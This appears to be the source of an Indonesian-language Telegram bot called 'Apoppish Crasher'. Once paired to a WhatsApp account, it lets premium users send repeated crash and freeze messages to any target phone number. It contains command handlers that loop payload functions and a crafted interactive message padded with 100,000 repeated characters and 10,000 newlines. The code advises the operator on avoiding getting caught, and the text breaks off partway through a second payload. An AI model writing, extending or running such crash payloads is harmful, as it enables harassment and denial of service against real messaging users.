const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const path = require("path");
const chalk = require('chalk');
const { TOKEN_USER, ModuleApiBot, } = require("./config.js");
const crypto = require('crypto');
const G1 = './Invisible.jpg';
const premiumFile = './Database/premiumuser.json';
const ownerFile = './Database/owneruser.json';
const adminFile = './Database/adminuser.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(TOKEN_USER);

bot.use(session());

// ======== [ GITHUB INTEGRATION ] =================

const axios = require("axios");

const GITHUB_TOKEN_LIST_URL = ""; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(TOKEN_USER)) {
    console.log(chalk.red("WARNING! KAMU TERDETEKSI SEBAGAI PENYUSUP. MOHON HUBUNGI OWNER / DEV  UNTUK MEMBELI AKSES."));
    process.exit(1);
  }

  console.log(chalk.green(` (#)TOKEN TERVERFIKASI⠀⠀`));
  startBot();
}



function startBot() {
  console.log(chalk.green(`YEY! TOKEN KAMU TERVERFIKASI`));
  
  console.clear();
  console.log(chalk.bold.white("APOPPISH CRASHER"));
    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("@Gabrieltzyproooool"));
    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("10.0.0\n\n"));
    console.log(chalk.bold.green("Bot Berjalan. . ."));
}

validateToken();

// ========================= [ GITHUB AKSES ] =========================

async function loadOctokit() {
    const { Octokit } = await import('@octokit/rest');
    return new Octokit({ auth: githubToken });
}

// ========================= [ GITHUB AKSES ] =========================
async function getGitHubData(path) {
    const octokit = await loadOctokit();
    try {
        const response = await octokit.repos.getContent({
            owner,
            repo,
            path,
        });
        const content = Buffer.from(response.data.content, 'base64').toString();
        return { data: JSON.parse(content), sha: response.data.sha };
    } catch (error) {
        console.error("Error fetching :", error);
        return { data: null, sha: null };
    }
}

// ========================= [ GITHUB AKSES ] =========================
async function updateGitHubData(path, content, sha) {
    const octokit = await loadOctokit();
    try {
        await octokit.repos.createOrUpdateFileContents({
            owner,
            repo,
            path,
            message: `Update`,
            content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
            sha,
        });
        console.log(`updated successfully.`);
    } catch (error) {
        console.error("Error updating data on GitHub:", error);
    }
}

async function isValidToken(token) {
    const { data: tokens } = await getGitHubData(tokenPath);
    return tokens && tokens.includes(token);
}

// ========================= [ MODERATOR MANAGEMENT ] =========================

async function isModerator(userId) {
    const { data: moderators } = await getGitHubData(moderatorsPath);
    return moderators && moderators.includes(userId);
}

async function addModerator(userId) {
    const { data: moderators, sha } = await getGitHubData(moderatorsPath);
    if (moderators && !moderators.includes(userId)) {
        moderators.push(userId);
        await updateGitHubData(moderatorsPath, moderators, sha);
    }
}

async function deleteModerator(userId) {
    const { data: moderators, sha } = await getGitHubData(moderatorsPath);
    if (moderators) {
        const updatedModerators = moderators.filter(id => id !== userId);
        await updateGitHubData(moderatorsPath, updatedModerators, sha);
    }
}

// ========================= [  ] =========================

let Sat = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const randomImages = [
    "https://files.catbox.moe/zfwj07.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

function deleteFiles() {
    const filesToDelete = ['TokenId.js', 'package.json'];
    filesToDelete.forEach(file => {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
            console.log(`Hapus ${file} No Akses.`);
        }
    });
}

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Sat = makeWASocket(connectionOptions);

    Sat.ev.on('creds.update', saveCreds);
    store.bind(Sat.ev);

    Sat.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
❌ Nomor sender tidak di temukan atau tidak terhubung
`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}

// ========================= [ TOKEN MANAGEMENT COMMANDS (Only for Developers) ] =========================

// ========================= [ START MENU ] =========================

bot.command('start', async (ctx) => {
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\`
╭━( 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 )
┃◇ Name : Takasi Mitsuya
┃◇ Version : 10.0
┃◇ Developer : @TakashiMieAyam1
┃◇ User ID : ${senderId}
┃◇ Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓
Select Button Below Here.\`\`\``,
 
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
         [
             Markup.button.callback('BUG OPTION', 'indictive1'),
             Markup.button.callback('OWNER MENU', 'indictive2'),
         ],
         [
             Markup.button.url('⌜ Developer ⌟', 'https://t.me/Gabrieltzyproooool'),
         ],
         [
             Markup.button.callback('CEK ID', 'cekid'),
             Markup.button.callback('THANKS', 'Thanks'),
         ]
       ])
    });
})-

// Perintah untuk mengecek status ID
bot.action('cekid', async (ctx) => {
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back to Menu', 'startback')],
  ]);

  const caption = `\`\`\`
𝗜𝗗 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗔𝗡𝗗𝗔

𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${ctx.from.first_name}
𝗜𝗗 : ${senderId}\`\`\``
    await editMenu(ctx, caption, buttons);
});

bot.action('indictive1', async (ctx) => {
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back to Menu', 'startback')],
    [Markup.button.url('🍷', 'https://t.me/Gabrieltzyproooool')],
  ]);

  const caption = `\`\`\`
╭━( 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 )
┃◇ Name : Takasi Mitsuya
┃◇ Version : 10.0
┃◇ Developer : @TakashiMieAyam1
┃◇ User ID : ${senderId}
┃◇ Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝙰𝙿𝙾𝙿𝙿𝙸𝚂𝙷 𝙱𝚄𝙶)
┃◇ /ghostfc[ 62xxx ]
┃◇ /xcbeta [ 62xxx ]
┃◇ /fcios [ 62xxx ]
┃◇ /crastks [ 62xxx ]
┃◇ /xcdelay [ 62xxx ]
╰━━━━━━━━━━━━━━━━━━⭓\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('indictive2', async (ctx) => {
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back to Menu', 'startback')],
    [Markup.button.url('🍷', 'https://t.me/@TakashiMieAyam1')],
  ]);

  const caption = `\`\`\`
╭━( 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 )
┃◇ Name : Takasi Mitsuya
┃◇ Version : 10.0
┃◇ Developer : @TakashiMieAyam1
┃◇ User ID : ${senderId}
┃◇ Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 )
┃◇ /addprem [ id ]
┃◇ /delprem [ id ]
┃◇ /cekprem 
┃◇ /pairing [ 62xxx ]
┃◇ /addadmin [ id ]
┃◇ /deladmin [ id ]
╰━━━━━━━━━━━━━━━━━━⭓\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('Thanks', async (ctx) => {
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('⌫ Back ', 'startback')],
    [Markup.button.url('Developer', 'https://t.me/TakashiMieAyam1')],
  ]);

  const caption = `\`\`\`
╭━( 𝚃𝙷𝙰𝙽𝙺𝚂 𝚃𝙾 )
┃◇ Wolf - Dixey
┃◇ Gabriel - Dixey
┃◇ ALL Oktagram Silent 
╰━━━━━━━━━━━━⭓\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk Bug--
bot.action('startback', async (ctx) => {
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('BUG OPTION', 'indictive1'),
             Markup.button.callback('OWNER MENU', 'indictive2'),
         ],
         [
             Markup.button.url('⌜ DEVELOPER ⌟', 'https://t.me/TakashiMieAyam1'),
         ],
         [
             Markup.button.callback('CEK ID', 'cekid'),
             Markup.button.callback('THANKS TO', 'Thanks'),
         ]
]);

  const caption = `\`\`\`
╭━( 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 )
┃◇ Name : Takasi Mitsuya
┃◇ Version : 10.0
┃◇ Developer : @TakashiMieAyam1
┃◇ User ID : ${senderId}
┃◇ Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓
Select Button Below Here.\`\`\` `;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `\`\`\`
#- T A K A S H I - M I T S U Y A 
└⊱ Please Pause During Bug So You Don't Get Caught
──────────────────────
TARGET ; ${target}
STATUS ; 🟢 Succesfully

© Takasi Mitsuya
\`\`\``,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('⌫ Back to Menu', 'indictive1'),
                       Markup.button.url('⌜ Dev ⌟', 'https://t.me/TakashiMieAyam1'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By Takashi')));
    })();
}
// COMMAND BUG
bot.command("ghostforce", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🔄 Proses meluncurkan serangan...`);

    for (let i = 0; i < 15; i++) {
     await VampireFCAllDev(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
PROSES SEND BUG....
TARGET : ${aiiNumber}`);
   await donerespone(target, ctx);
});

bot.command("xcbeta", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🔄 Proses meluncurkan serangan...`);

    for (let i = 0; i < 15; i++) {
     await VampireFCAllDev(target);
     await VampCrashBeta(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
PROSES SEND BUG....
TARGET : ${aiiNumber}`);
   await donerespone(target, ctx);
});

bot.command("fcios", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🔄 Proses meluncurkan serangan...`);

    for (let i = 0; i < 15; i++) {
     await VampCrashFCIphone(target);
     await Blank(target);
     await VampCrashFCIphone(target);
     await Blank(target);
     await VampCrashFCIphone(target); 
     await Blank(target);
     await VampCrashFCIphone(target); 
     await Blank(target);
     await VampCrashFCIphone(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
PROSES SEND BUG....
TARGET : ${aiiNumber}`);
   await donerespone(target, ctx);
});

bot.command("xcdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🔄 Proses meluncurkan serangan...`);

    for (let i = 0; i < 5; i++) {
     await RyuciDelay(target, false);
     await VampBroadcast(target, false);
     await protocolbug7(target, false);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
PROSES SEND BUG....
TARGET : ${aiiNumber}`);
   await donerespone(target, ctx);
});

bot.command("crashapps", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`🔄 Proses meluncurkan serangan...`);

    for (let i = 0; i < 15; i++) {
     await VampireFCAllDev(target);
     await VampireUi(target, Ptcp = false);
     await VampUrlCrash(target, Ptcp = false);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
PROSES SEND BUG....
TARGET : ${aiiNumber}`);
   await donerespone(target, ctx);
});
// ========================= [ TELEGRAM BOT COMMANDS ] =========================

// /addtoken command

//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 Pengguna ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 123456789");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses Admin!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("pairing", checkPremium, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /pairing <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Sat && Sat.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Sat.requestPairingCode(phoneNumber, "APOPPISH");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`Pairing!
Kode : ${formattedCode}
Number : ${phoneNumber}
\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('v10', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//~~~~~~~~~~~~~~~~~~~FUNC BUG~~~~~~~~~~~~~~~~~~~\\
const VampTagFc = {
  key: {
    fromMe: true,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: {
        title: "Apoppish Is Back👻",
         text: "Apoppish Is Here",
         footer: "This Is wolf?",
        description: "?"
      },
      carouselMessage: {
        cards: [
          {
            header: {
              title: "Apoppish Is Back 😘",
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQPEQi110T9Gr0bTYAdoYmRYfq_NuzRcLZ5AgBr1gyvXvLY6IU-SFSRGuWBUkGfgb6yFiVbiBGcUpp8dYWL18HriBIKNJQfpwS711PZz2g?ccb=9-4&oh=01_Q5Aa1gHPavy_w2xebEXpI3FdYVuKkB6Kl5QTrdMzgN79eHBdDw&oe=686CC8A3&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "VNzgOnwtFRZwLwsqGoNgStzUu6VsFq2E50ErDY3fxwU=",
                fileLength: "287554",
                height: 1024,
                width: 1024,
                mediaKey: "f8D56tNF7Jgdrde2qMbOBEXlKCH8hs1jckACfxMBUJ8=",
                fileEncSha256: "yrXtNzm9ItleMY2Yz3/kY9B660QmxAgg9xz9igALXeA=",
                directPath: "/o1/v/t24/f2/m239/AQPEQi110T9Gr0bTYAdoYmRYfq_NuzRcLZ5AgBr1gyvXvLY6IU-SFSRGuWBUkGfgb6yFiVbiBGcUpp8dYWL18HriBIKNJQfpwS711PZz2g?ccb=9-4&oh=01_Q5Aa1gHPavy_w2xebEXpI3FdYVuKkB6Kl5QTrdMzgN79eHBdDw&oe=686CC8A3&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1749372273",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAEBQACAwEGAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAATcIlmMPMVJZoEBXJxSSaZ9JQNx7xKsGWD6V7O9yMm2vKBxhhKNfbYWiuFdEG+f6jqii00/xSwaLa0uf/xAAkEAACAgIBBAMBAQEAAAAAAAABAgARAxIhBBMxQRQiUWEFI//aAAgBAQABPwDthk4H2ETCXNQ9M49QYGF2PHqHA1KR7nx+J22LUI4CVQmOsZBPv1HznbVABMOI5Gq6oWTOhy9OwyI9bAx+31HUsmI0K4jo+IMwbkHmJnBNkC/2ZEJNg2IfqAS1kxlHDL6mDqcaK14zbRdSHI83MGdcWcOJ1GYZGbRSNvM4Rf7FLA2OQRyIWUxAAT9qoQ/9uSSD7EX6sQTxETYk3Qi5Fx/QWQfJjIATRupfBqAKhYGjxO1kKowAAq7h6XKVxv4LNREb/MyryzeWqfBbERzdgz4rhbA4NWZmHZbVh4jcgkCIi5mCAUb4j4m7eNVyAqj0RO7lff7A6PSzqM3ZSzlDMreIuHIcneGUl9NgpgXIVVTk50vWdRjw5MRzb2fFy9QV9CdBaHuGrA4nyAzorMuwszG6YioZhsz2Z1LJ2MoOuxNiJnIx4xsoGlNFzDJkxMrD6WJhcM3UYbGp5EzFtj+QOaozYfhm4/DAykzcf2bj8MDhfAMZy0//xAAZEQABBQAAAAAAAAAAAAAAAAAhARARIDD/2gAIAQIBAT8AoZcpj//EAB4RAAMAAQQDAAAAAAAAAAAAAAABEQIQITFREkFh/9oACAEDAQE/ACbUak+6Pwxx7voQ93YTDON8cTSlLpF2Rdjh/9k=",
                scansSidecar: "gEedIqFUVuURFyxuDXiES/ApmRF2SvVhKGpUjvrdz/JxAEcwvuFtiA==",
                scanLengths: [19972, 38699, 68065, 51270]
              },
              hasMediaAttachment: true
            },
            body: {
              text: "Apoppish Is Back 😘" + "ꦽ".repeat(100000)
            },
            footer: {
              text: "Apoppish"
            },
            nativeFlowMessage: {
              messageParamsJson: "\n".repeat(10000)
            }
          }
        ]
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};

async function VampUrlCrash(target, Ptcp = true) {
  let pesan = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            title: "\u0000",
            text: "Apoppish Crasher",
            footer: "\u4000",
            description: "Wolf"
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: "Apoppish Is Back 😘",
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "DB/+n19HzggqZQiywcEYAlHH50RbEI0pwXrxD5kkLlA=",
                    fileLength: "178006",
                    height: 1,
                    width: 1,
                    mediaKey: "k6jdnVseHd/eIGBEEkBdtLqwr5L1I7X+jH5WStYQ1tY=",
                    fileEncSha256: "7cEoBgfRxb44DFjw8j+Zjy8GniEqoXWTw1DD98V4eVQ=",
                    directPath: "/o1/v/t24/f2/m234/AQMcsHgJduBlnnAdYUKKvZR6K68unf7-QyUGxiAbmersAyOKWrWQImD-HxZQ4Edsbe4z4Vf69d1cl2NNH94TEeYQxUJKVKAHayLoQONY-w?ccb=9-4&oh=01_Q5Aa1gFIJSOQsH5-cmce_ee4C_CiwYWMbABLd7WBq96f8N-BbA&oe=686B2C5A&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1749267080",
